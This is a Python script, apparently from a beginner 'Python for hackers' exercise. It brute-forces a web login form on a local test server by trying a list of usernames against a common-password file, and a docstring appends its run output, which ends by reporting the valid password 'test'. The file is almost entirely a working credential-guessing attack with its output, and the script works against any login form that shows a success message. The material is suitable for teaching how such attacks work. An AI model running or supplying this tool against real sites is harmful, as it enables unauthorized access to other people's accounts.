import requests
import sys

target = 'http://127.0.0.1:5000/'
needle = 'Logged in successfully!'
username_list = ['root','test','anamika']
password_file = 'common_passwords.txt'
f =  open(password_file , 'r')
passwords_list =  [pwd.strip("\n").encode() for pwd in f.read().split("\n")]
f.close()

for username in username_list:
    for password in passwords_list:
        sys.stdout.write(f'Attempting USERNAME : {username} and PASSWORD : {password}\n')
        sys.stdout.flush()
        r = requests.post(target , data = {
            'username':username,
            'password':password
        })
        if needle.encode() in r.content:
            sys.stdout.write(f"\nVALID PASSWORD : {password.decode()}\n")
            sys.exit(0)
            break
    sys.stdout.flush()
    sys.stdout.write("NO PASSWORD FOUND")


"""

OUTPUT :


(env) ┌─[user@parrot]─[~/Documents/py101_for_hackers]
└──╼ $python3 web_brute_force.py 
Attempting USERNAME : root and PASSWORD : b'root'
Attempting USERNAME : root and PASSWORD : b'toor'
Attempting USERNAME : root and PASSWORD : b'raspberry'
Attempting USERNAME : root and PASSWORD : b'dietpi'
Attempting USERNAME : root and PASSWORD : b'parrot'
Attempting USERNAME : root and PASSWORD : b'test'
Attempting USERNAME : root and PASSWORD : b'uploader'
Attempting USERNAME : root and PASSWORD : b'password'
Attempting USERNAME : root and PASSWORD : b'admin'
Attempting USERNAME : root and PASSWORD : b'administrator'
Attempting USERNAME : root and PASSWORD : b'marketing'
Attempting USERNAME : root and PASSWORD : b'12345678'
Attempting USERNAME : root and PASSWORD : b'1234'
Attempting USERNAME : root and PASSWORD : b'12345'
Attempting USERNAME : root and PASSWORD : b'qwerty'
Attempting USERNAME : root and PASSWORD : b'webadmin'
Attempting USERNAME : root and PASSWORD : b'webmaster'
Attempting USERNAME : root and PASSWORD : b'maintenance'
Attempting USERNAME : root and PASSWORD : b'techsupport'
Attempting USERNAME : root and PASSWORD : b'letmein'
Attempting USERNAME : root and PASSWORD : b'logon'
Attempting USERNAME : root and PASSWORD : b'Passw@rd'
Attempting USERNAME : root and PASSWORD : b'alpine'
Attempting USERNAME : root and PASSWORD : b'parrot'
Attempting USERNAME : root and PASSWORD : b''
Attempting USERNAME : root and PASSWORD : b''
NO PASSWORD FOUNDAttempting USERNAME : test and PASSWORD : b'root'
Attempting USERNAME : test and PASSWORD : b'toor'
Attempting USERNAME : test and PASSWORD : b'raspberry'
Attempting USERNAME : test and PASSWORD : b'dietpi'
Attempting USERNAME : test and PASSWORD : b'parrot'
Attempting USERNAME : test and PASSWORD : b'test'

VALID PASSWORD : test
(env) ┌─[user@parrot]─[~/Documents/py101_for_hackers]
└──╼ $


"""
